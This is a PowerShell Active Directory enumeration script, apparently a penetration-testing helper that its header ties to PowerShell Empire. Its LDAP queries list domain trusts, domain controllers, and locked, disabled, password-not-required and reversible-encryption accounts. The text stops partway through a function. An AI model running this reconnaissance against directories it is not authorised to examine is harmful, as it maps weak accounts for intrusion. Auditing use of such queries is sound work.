 # Version 0.45.3
# ------------------------------------------------------------
#                   Syntax / General Comments
# ------------------------------------------------------------
# Usage: Dump-DomainInfo 
# Usage: Dump-DomainInfo -Verbose 
# Usage: Dump-DomainInfo -Verbose -DomainController ip -username domain\user -password 'passwordhere'
# Usage: Dump-DomainInfo -Verbose -DomainController ip -Credential domain\user 
#
# Just to use for dumping info quickly from a non domain system.  Use PowerShell Empire for everything else.
# note: seems to be a little buggy on windows 10
# Todo:
# - perform server availability check at the beginning of all functions
# - perform cred valiation check at the start of each script
# - finish transplanting and rewriting functions
# - standardize table names and comment formatting
# - add credential option to all functions
# - add code sourcing for all functions
# - index functions in dump-domaininfo function and support out: csv,xls,tables in mem,sqlite
# - fix bug: bombs when only an alternative domaincontroller is set with no creds
# - and function descriptions etc for each function
# - make all function pipelinable inbound


# ------------------------------------------------------------
#                            Functions
# ------------------------------------------------------------


# ------------------------------
# Function: Get-Domain
# ------------------------------
Function Get-Domain{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
        [int]$Limit = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [string]$SearchScope = "Subtree"
    )
    Begin
    {        
        # Create PS Credential object
        if($Password){
            $secpass = ConvertTo-SecureString $Password -AsPlainText -Force
            $Credential = New-Object System.Management.Automation.PSCredential ($Username, $secpass)                
        }

        # Create the connection to LDAP
        if ($DomainController -and $Credential.GetNetworkCredential().Password)
        {
            $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }else{
            $objDomain = [ADSI]""  
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }

        # Create data table to house results
        $TblDomain = New-Object System.Data.DataTable 
        $TblDomain.Columns.Add("SourceDomain") | Out-Null
        $TblDomain.Columns.Add("SourceDomainDn") | Out-Null
    }

    Process
    {
        try
        {
            # Setup ldap filters
            $ObjSearcher.PageSize = $Limit
            $ObjSearcher.Filter = $CompFilter
            $ObjSearcher.SearchScope = $SearchScope
           
            # Get source domain
            [string]$SourceDomain = [string]$ObjDomain.distinguishedName -replace "DC=","" -replace ",","."

            # Add domain to table
            $TblDomain.Rows.Add(
                    [string]$SourceDomain,
                    [string]$ObjDomain.distinguishedName
            ) | Out-Null
        }
        catch
        {
          "Error was $_"
          $line = $_.InvocationInfo.ScriptLineNumber
          "Error was in Line $line"
        }
    }

    End
    {     
        # Check for domain
        if($TblDomain.Rows.Count -gt 0)
        {
            return $TblDomain
        }else{
            Write-Verbose "Couldn't get the domain."
        }
    }
}


# ------------------------------
# Function: Get-DomainTrust
# ------------------------------
# Reference: https://msdn.microsoft.com/en-us/library/ms683977(v=vs.85).aspx
# Reference: https://technet.microsoft.com/en-us/library/cc775736(v=ws.10).aspx
# Reference: https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1
Function Get-DomainTrust {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController
    )
    Begin
    {
        Write-Verbose "Getting domain trusts..."

        # Create data table to house results
        $TblTrusts = New-Object System.Data.DataTable 
        $TblTrusts.Columns.Add("SourceDomain") | Out-Null
        $TblTrusts.Columns.Add("SourceDomainDn") | Out-Null
        $TblTrusts.Columns.Add("TrustedDomain") | Out-Null
        $TblTrusts.Columns.Add("TrustedDomainDn") | Out-Null
        $TblTrusts.Columns.Add("Trusttype") | Out-Null
        $TblTrusts.Columns.Add("Trustdirection") | Out-Null
        $TblTrusts.Columns.Add("Trustattributes") | Out-Null
        $TblTrusts.Columns.Add("Whencreated") | Out-Null
        $TblTrusts.Columns.Add("Whenchanged") | Out-Null
        $TblTrusts.Columns.Add("Objectclass") | Out-Null
        $TblTrusts.Clear()
    }

    Process
    {
        try
        {                      
            # Get objects
            $DomainTrusts = Get-DomainObject -LdapFilter "(objectClass=trustedDomain)" -DomainController $DomainController -username $username -password $password -Credential $Credential

            # Parse results
            $DomainTrusts | ForEach-Object {
                
                # Resolve trust direction
                $TrustDirection = Switch ($_.properties.trustdirection) {
                    0 { "Disabled" }
                    1 { "Inbound" }
                    2 { "Outbound" }
                    3 { "Bidirectional" }
                }

                # Resolve trust attribute
                $TrustAttrib = Switch ($_.properties.trustattributes){
                    0x001 { "non_transitive" }
                    0x002 { "uplevel_only" }
                    0x004 { "quarantined_domain" }
                    0x008 { "forest_transitive" }
                    0x010 { "cross_organization" }
                    0x020 { "within_forest" }
                    0x040 { "treat_as_external" }
                    0x080 { "trust_uses_rc4_encryption" }
                    0x100 { "trust_uses_aes_keys" }
                    Default {                 
                        "$($_.properties.trustattributes)";
                    }
                }

                # Resolve trust type
                # Reference: https://support.microsoft.com/en-us/kb/228477
                $TrustType = Switch ($_.properties.trusttype){
                    1 {"Downlevel Trust (Windows NT domain external)"}
                    2 {"Uplevel Trust (Active Directory domain - parent-child, root domain, shortcut, external, or forest)"}
                    3 {"MIT (non-Windows Kerberos version 5 realm)"}
                    4 {"DCE (Theoretical trust type - DCE refers to Open Group's Distributed Computing)"}
                }

                # Get domain name
                $SourceDomain = Get-Domain -DomainController $DomainController -username $username -password $password -Credential $Credential | Select-Object SourceDomain -ExpandProperty SourceDomain

                # Get domain dn
                $SourceDomainDn = Get-Domain -DomainController $DomainController -username $username -password $password -Credential $Credential | Select-Object SourceDomainDn -ExpandProperty SourceDomainDn

                # Add trust to table
                $TblTrusts.Rows.Add(
                    [string]$SourceDomain,
                    [string]$SourceDomainDn,
                    [string]$_.properties.trustpartner,
                    [string]$_.properties.distinguishedname,
                    [string]$TrustType,
                    [string]$TrustDirection,
                    [string]$TrustAttrib,
                    [string]$_.properties.whencreated,
                    [string]$_.properties.whenchanged,
                    [string]$_.properties.objectclass
                ) | Out-Null
            }        
        }
        catch
        {
          #"Error was $_"
          #$line = $_.InvocationInfo.ScriptLineNumber
          #"Error was in Line $line"
        }
    }

    End
    {     
        # Check for trusts
        if($TblTrusts.Rows.Count -gt 0)
        {
            $TblTrustsCount = $TblTrusts.Rows.Count
            Write-Verbose "$TblTrustsCount trusted domains were found."
            return $TblTrusts
        }else{
            Write-Verbose "0 trusted domains were found." 
        }           
    }
}


# -------------------------------
# Function: Get-DomainComputerDC
# -------------------------------
# Reference:  http://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx
function Get-DomainComputerDC
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController
    )

    Begin
    {
        Write-Verbose "Getting domain controllers..."

        # Create table for domain controllers
        $TableDomainControllers = New-Object System.Data.DataTable 
        $TableDomainControllers.Columns.Add("name") | Out-Null
        $TableDomainControllers.Columns.Add("dnshostname") | Out-Null
        $TableDomainControllers.Columns.Add("operatingsystem ") | Out-Null
        $TableDomainControllers.Columns.Add("operatingsystemversion") | Out-Null 
        $TableDomainControllers.Columns.Add("operatingsystemservicepack") | Out-Null
        $TableDomainControllers.Columns.Add("whenchanged") | Out-Null
        $TableDomainControllers.Columns.Add("logoncount") | Out-Null
        $TableDomainControllers.Columns.Add("description") | Out-Null   
        $TableDomainControllers.Clear()
    }

    Process
    {
        try
        {
            # Get results
            $DCResults = Get-DomainObject -LdapFilter "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" -DomainController $DomainController -username $username -password $password -Credential $Credential

            # Parse results
            $DCResults | ForEach-Object {

                # Add results to table
                $TableDomainControllers.Rows.Add(
                [string]$_.properties.name,
                [string]$_.properties.dnshostname,
                [string]$_.properties.operatingsystem,
                [string]$_.properties.operatingsystemversion,
                [string]$_.properties.operatingsystemservicepack,
                [string]$_.properties.whenchanged,
                [string]$_.properties.logoncount, 
                [string]$_.properties.description   
                ) | Out-Null
            }
        }
        catch
        {
          "Error was $_"
          $line = $_.InvocationInfo.ScriptLineNumber
          "Error was in Line $line"
        }
    }

    End
    {
        # Check for results
        if($TableDomainControllers.Rows.Count -gt 0)
        {
            $TableDomainControllersCount = $TableDomainControllers.Rows.Count
            Write-Verbose "$TableDomainControllersCount domain controllers found."
            return $TableDomainControllers
        }else{
            Write-Verbose "No domain controllers found."
        }
    }
}


# -------------------------------------------
# Function: Get-DomainDcRoleNameMaster
# ------------------------------------------- 
#﻿ Ref: http://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx 
Function Get-DomainDcRoleNameMaster{
}


# -------------------------------------------
# Function: Get-DomainDcRoleGlobalCatalog
# -------------------------------------------  
#﻿ Ref: http://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx
Function Get-DomainDcRoleGlobalCatalog{
}


# -------------------------------------------
# Function: Get-DomainDcRoleInfrastructureMaster
# -------------------------------------------  
#﻿ Ref: http://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx
Function Get-DomainDcRoleInfrastructureMaster{
}


# -------------------------------------------
# Function: Get-DomainDcRolePDC
# ------------------------------------------- 
#﻿ Ref: http://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx  
Function Get-DomainDcRolePDC{
}


# -------------------------------------------
# Function: Get-DomainDcRoleRidMaster
# -------------------------------------------
#﻿ Ref: http://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx  
Function Get-DomainDcRoleRidMaster{
}

        
        
# -------------------------------------------
# Function: Get-DomainDcRoleSchemaMaster
# -------------------------------------------   
#﻿ Ref: http://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx
Function Get-DomainDcRoleSchemaMaster{
}


# -------------------------------------------
# Function: Get-DomainUsersLocked
# -------------------------------------------
# Ref: https://raw.githubusercontent.com/darkoperator/Posh-SecMod/master/Audit/Audit.psm1
function Get-DomainUsersLocked
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
        [int]$Limit = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [string]$SearchScope = "Subtree",

        [Parameter(Mandatory=$false,
        HelpMessage="Distinguished Name Path to limit search to.")]

        [string]$SearchDN
    )
    Begin
    {

        Write-Verbose "Getting locked domain users..."

        # Create PS Credential object
        if($Password){
            $secpass = ConvertTo-SecureString $Password -AsPlainText -Force
            $Credential = New-Object System.Management.Automation.PSCredential ($Username, $secpass)                
        }

        # Create the connection to LDAP
        if ($DomainController -and $Credential.GetNetworkCredential().Password)
        {
            $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }else{
            $objDomain = [ADSI]""  
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }
    }

    Process
    {

        try
        {          
        
            # Setup table for domain users
            $TableDomainUsers = New-Object System.Data.DataTable
            $TableDomainUsers.Columns.Add("objectsid") | Out-Null
            $TableDomainUsers.Columns.Add("samaccountname") | Out-Null
            $TableDomainUsers.Columns.Add("samaccounttype") | Out-Null
            $TableDomainUsers.Columns.Add("userprincipalname") | Out-Null
            $TableDomainUsers.Columns.Add("displayname") | Out-Null
            $TableDomainUsers.Columns.Add("givenname") | Out-Null
            $TableDomainUsers.Columns.Add("sn") | Out-Null
            $TableDomainUsers.Columns.Add("description") | Out-Null
            $TableDomainUsers.Columns.Add("admincount") | Out-Null
            $TableDomainUsers.Columns.Add("homedirectory") | Out-Null
            $TableDomainUsers.Columns.Add("memberof") | Out-Null
            $TableDomainUsers.Clear()

            # Setup the LDAP filter
            $CompFilter = "(&(sAMAccountType=805306368)(lockoutTime>=1))"
            $ObjSearcher.PageSize = $Limit
            $ObjSearcher.Filter = $CompFilter
            $ObjSearcher.SearchScope = "Subtree"

            if ($SearchDN)
            {
                $objSearcher.SearchDN = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($SearchDN)")
            }

            # Add domain user information to table
            $ObjSearcher.FindAll() | ForEach-Object {

                [string]$SidBytes = [byte[]]"$($_.Properties.objectsid)".split(" ");
                [string]$SidString = $SidBytes -replace ' ',''
                $TableDomainUsers.Rows.Add( 
                [string]$SidString,
                [string]$_.properties.samaccountname,
                [string]$_.properties.samaccounttype,
                [string]$_.properties.userprincipalname,
                [string]$_.properties.displayname,
                [string]$_.properties.givenname,
                [string]$_.properties.sn,  
                [string]$_.properties.description,       
                [string]$_.properties.admincount,
                [string]$_.properties.homedirectory,
                [string]$_.properties.memberof
                ) | Out-Null                        
            }

            # Check for domain users
            if($TableDomainUsers.Rows.Count -gt 0)
            {
                $TableDomainUsersCount = $TableDomainUsers.Rows.Count
                Write-Verbose "$TableDomainUsersCount locked domain users found."
                Return $TableDomainUsers
            }else{
                Write-Verbose "0 locked domain users were found."
            }
        }
        catch
        {
          "Error was $_"
          $line = $_.InvocationInfo.ScriptLineNumber
          "Error was in Line $line"
        }                
    }

    End
    {

    }
}


# -------------------------------------------
# Function: Get-DomainUserDisabled
# -------------------------------------------
# Ref: https://raw.githubusercontent.com/darkoperator/Posh-SecMod/master/Audit/Audit.psm1
function Get-DomainUsersDisabled
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
        [int]$Limit = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [string]$SearchScope = "Subtree",

        [Parameter(Mandatory=$false,
        HelpMessage="Distinguished Name Path to limit search to.")]

        [string]$SearchDN
    )
    Begin
    {

        Write-Verbose "Getting disabled domain users..."

        # Create PS Credential object
        if($Password){
            $secpass = ConvertTo-SecureString $Password -AsPlainText -Force
            $Credential = New-Object System.Management.Automation.PSCredential ($Username, $secpass)                
        }

        # Create the connection to LDAP
        if ($DomainController -and $Credential.GetNetworkCredential().Password)
        {
            $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }else{
            $objDomain = [ADSI]""  
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }
    }

    Process
    {

        try
        {          
        
            # Setup table for domain users
            $TableDomainUsers = New-Object System.Data.DataTable
            $TableDomainUsers.Columns.Add("objectsid") | Out-Null
            $TableDomainUsers.Columns.Add("samaccountname") | Out-Null
            $TableDomainUsers.Columns.Add("samaccounttype") | Out-Null
            $TableDomainUsers.Columns.Add("userprincipalname") | Out-Null
            $TableDomainUsers.Columns.Add("displayname") | Out-Null
            $TableDomainUsers.Columns.Add("givenname") | Out-Null
            $TableDomainUsers.Columns.Add("sn") | Out-Null
            $TableDomainUsers.Columns.Add("description") | Out-Null
            $TableDomainUsers.Columns.Add("admincount") | Out-Null
            $TableDomainUsers.Columns.Add("homedirectory") | Out-Null
            $TableDomainUsers.Columns.Add("memberof") | Out-Null
            $TableDomainUsers.Clear()

            # Setup the LDAP filter
            $CompFilter = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=2))"
            $ObjSearcher.PageSize = $Limit
            $ObjSearcher.Filter = $CompFilter
            $ObjSearcher.SearchScope = "Subtree"

            if ($SearchDN)
            {
                $objSearcher.SearchDN = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($SearchDN)")
            }

            # Add domain user information to table
            $ObjSearcher.FindAll() | ForEach-Object {

                [string]$SidBytes = [byte[]]"$($_.Properties.objectsid)".split(" ");
                [string]$SidString = $SidBytes -replace ' ',''
                $TableDomainUsers.Rows.Add( 
                [string]$SidString,
                [string]$_.properties.samaccountname,
                [string]$_.properties.samaccounttype,
                [string]$_.properties.userprincipalname,
                [string]$_.properties.displayname,
                [string]$_.properties.givenname,
                [string]$_.properties.sn,  
                [string]$_.properties.description,       
                [string]$_.properties.admincount,
                [string]$_.properties.homedirectory,
                [string]$_.properties.memberof
                ) | Out-Null                        
            }

            # Check for domain users
            if($TableDomainUsers.Rows.Count -gt 0)
            {
                $TableDomainUsersCount = $TableDomainUsers.Rows.Count
                Write-Verbose "$TableDomainUsersCount disabled domain users found."
                Return $TableDomainUsers
            }else{
                Write-Verbose "0 domain disabled users were found."
            }
        }
        catch
        {
          "Error was $_"
          $line = $_.InvocationInfo.ScriptLineNumber
          "Error was in Line $line"
        }                
    }

    End
    {

    }
}


# -------------------------------------------
# Function: Get-DomainUser
# -------------------------------------------
# Ref: http://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx
function Get-DomainUser
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        ValueFromPipeline=$true,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Domain user to filter on.")]
        [string]$User = "*"
    )

    Begin
    {
        Write-Verbose "Getting domain users..."

        # Setup table for domain users
        $TableDomainUsers = New-Object System.Data.DataTable
        $TableDomainUsers.Columns.Add("objectsid") | Out-Null
        $TableDomainUsers.Columns.Add("samaccountname") | Out-Null
        $TableDomainUsers.Columns.Add("samaccounttype") | Out-Null
        $TableDomainUsers.Columns.Add("userprincipalname") | Out-Null
        $TableDomainUsers.Columns.Add("displayname") | Out-Null
        $TableDomainUsers.Columns.Add("givenname") | Out-Null
        $TableDomainUsers.Columns.Add("sn") | Out-Null
        $TableDomainUsers.Columns.Add("description") | Out-Null
        $TableDomainUsers.Columns.Add("admincount") | Out-Null
        $TableDomainUsers.Columns.Add("homedirectory") | Out-Null
        $TableDomainUsers.Columns.Add("memberof") | Out-Null
        $TableDomainUsers.Columns.Add("msDS-SupportedEncryptionTypes") | Out-Null
        $TableDomainUsers.Clear()
    }

    Process
    {
        try
        {          
            # Get results
            $UserResults = Get-DomainObject -LdapFilter "(&(objectCategory=person)(objectClass=user)(SamAccountName=$User))" -DomainController $DomainController -username $username -password $password -Credential $Credential

            # Parse results
            $UserResults | ForEach-Object {

                [string]$SidBytes = [byte[]]"$($_.Properties.objectsid)".split(" ");
                [string]$SidString = $SidBytes -replace ' ',''

                # Add domain user information to table
                $TableDomainUsers.Rows.Add( 
                [string]$SidString,
                [string]$_.properties.'samaccountname',
                [string]$_.properties.samaccounttype,
                [string]$_.properties.userprincipalname,
                [string]$_.properties.displayname,
                [string]$_.properties.givenname,
                [string]$_.properties.sn,  
                [string]$_.properties.description,       
                [string]$_.properties.admincount,
                [string]$_.properties.homedirectory,
                [string]$_.properties.memberof,
                [string]$($_.properties['msDS-SupportedEncryptionTypes']) 
                ) | Out-Null                        
            }
        }catch{
          "Error was $_"
          $line = $_.InvocationInfo.ScriptLineNumber
          "Error was in Line $line"
        }                
    }

    End
    {
        # Check for results
        if($TableDomainUsers.Rows.Count -gt 0)
        {
            $TableDomainUsersCount = $TableDomainUsers.Rows.Count
            Write-Verbose "$TableDomainUsersCount domain users found."
            Return $TableDomainUsers
        }else{
            Write-Verbose "0 domain users were found."
        }
    }
}


# -------------------------------------------
# Function: Get-DomainUserPwNotRequired
# -------------------------------------------
# Ref: http://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx
function Get-DomainUserPwNotRequired
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        ValueFromPipeline=$true,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Domain user to filter on.")]
        [string]$User = "*"
    )

    Begin
    {
        Write-Verbose "Getting domain users that do not require a password..."

        # Setup table for domain users
        $TableDomainUsers = New-Object System.Data.DataTable
        $TableDomainUsers.Columns.Add("objectsid") | Out-Null
        $TableDomainUsers.Columns.Add("samaccountname") | Out-Null
        $TableDomainUsers.Columns.Add("samaccounttype") | Out-Null
        $TableDomainUsers.Columns.Add("userprincipalname") | Out-Null
        $TableDomainUsers.Columns.Add("displayname") | Out-Null
        $TableDomainUsers.Columns.Add("givenname") | Out-Null
        $TableDomainUsers.Columns.Add("sn") | Out-Null
        $TableDomainUsers.Columns.Add("description") | Out-Null
        $TableDomainUsers.Columns.Add("admincount") | Out-Null
        $TableDomainUsers.Columns.Add("homedirectory") | Out-Null
        $TableDomainUsers.Columns.Add("memberof") | Out-Null
        $TableDomainUsers.Clear()
    }

    Process
    {
        try
        {          
            # Get results
            $UserResults = Get-DomainObject -LdapFilter "(&(objectCategory=person)(objectClass=user)(SamAccountName=$User)(userAccountControl:1.2.840.113556.1.4.803:=32))" -DomainController $DomainController -username $username -password $password -Credential $Credential

            # Parse results
            $UserResults | ForEach-Object {

                [string]$SidBytes = [byte[]]"$($_.Properties.objectsid)".split(" ");
                [string]$SidString = $SidBytes -replace ' ',''

                # Add domain user information to table
                $TableDomainUsers.Rows.Add( 
                [string]$SidString,
                [string]$_.properties.samaccountname,
                [string]$_.properties.samaccounttype,
                [string]$_.properties.userprincipalname,
                [string]$_.properties.displayname,
                [string]$_.properties.givenname,
                [string]$_.properties.sn,  
                [string]$_.properties.description,       
                [string]$_.properties.admincount,
                [string]$_.properties.homedirectory,
                [string]$_.properties.memberof
                ) | Out-Null                        
            }
        }catch{
          "Error was $_"
          $line = $_.InvocationInfo.ScriptLineNumber
          "Error was in Line $line"
        }                
    }

    End
    {
        # Check for results
        if($TableDomainUsers.Rows.Count -gt 0)
        {
            $TableDomainUsersCount = $TableDomainUsers.Rows.Count
            Write-Verbose "$TableDomainUsersCount domain users found."
            Return $TableDomainUsers
        }else{
            Write-Verbose "0 domain users were found."
        }
    }
}


# -------------------------------------------
# Function: Get-DomainUserPwStoredRevEnc
# -------------------------------------------
# Ref: http://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx
function Get-DomainUserPwStoredRevEnc
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        ValueFromPipeline=$true,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Domain user to filter on.")]
        [string]$User = "*"
    )

    Begin
    {
        Write-Verbose "Getting domain users with passwords stored using reversible encryption..."

        # Setup table for domain users
        $TableDomainUsers = New-Object System.Data.DataTable
        $TableDomainUsers.Columns.Add("objectsid") | Out-Null
        $TableDomainUsers.Columns.Add("samaccountname") | Out-Null
        $TableDomainUsers.Columns.Add("samaccounttype") | Out-Null
        $TableDomainUsers.Columns.Add("userprincipalname") | Out-Null
        $TableDomainUsers.Columns.Add("displayname") | Out-Null
        $TableDomainUsers.Columns.Add("givenname") | Out-Null
        $TableDomainUsers.Columns.Add("sn") | Out-Null
        $TableDomainUsers.Columns.Add("description") | Out-Null
        $TableDomainUsers.Columns.Add("admincount") | Out-Null
        $TableDomainUsers.Columns.Add("homedirectory") | Out-Null
        $TableDomainUsers.Columns.Add("memberof") | Out-Null
        $TableDomainUsers.Clear()
    }

    Process
    {
        try
        {          
            # Get results
            $UserResults = Get-DomainObject -LdapFilter "(&(objectCategory=person)(objectClass=user)(SamAccountName=$User)(userAccountControl:1.2.840.113556.1.4.803:=128))" -DomainController $DomainController -username $username -password $password -Credential $Credential

            # Parse results
            $UserResults | ForEach-Object {

                [string]$SidBytes = [byte[]]"$($_.Properties.objectsid)".split(" ");
                [string]$SidString = $SidBytes -replace ' ',''

                # Add domain user information to table
                $TableDomainUsers.Rows.Add( 
                [string]$SidString,
                [string]$_.properties.samaccountname,
                [string]$_.properties.samaccounttype,
                [string]$_.properties.userprincipalname,
                [string]$_.properties.displayname,
                [string]$_.properties.givenname,
                [string]$_.properties.sn,  
                [string]$_.properties.description,       
                [string]$_.properties.admincount,
                [string]$_.properties.homedirectory,
                [string]$_.properties.memberof
                ) | Out-Null                        
            }
        }catch{
          "Error was $_"
          $line = $_.InvocationInfo.ScriptLineNumber
          "Error was in Line $line"
        }                
    }

    End
    {
        # Check for results
        if($TableDomainUsers.Rows.Count -gt 0)
        {
            $TableDomainUsersCount = $TableDomainUsers.Rows.Count
            Write-Verbose "$TableDomainUsersCount domain users found."
            Return $TableDomainUsers
        }else{
            Write-Verbose "0 domain users were found."
        }
    }
}


# -------------------------------------------
# Function: Get-DomainUserSmartCardRequired
# -------------------------------------------
# Ref: http://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx
function Get-DomainUserSmartCardRequired
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        ValueFromPipeline=$true,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Domain user to filter on.")]
        [string]$User = "*"
    )

    Begin
    {
        Write-Verbose "Getting domain users that require a smart card..."

        # Setup table for domain users
        $TableDomainUsers = New-Object System.Data.DataTable
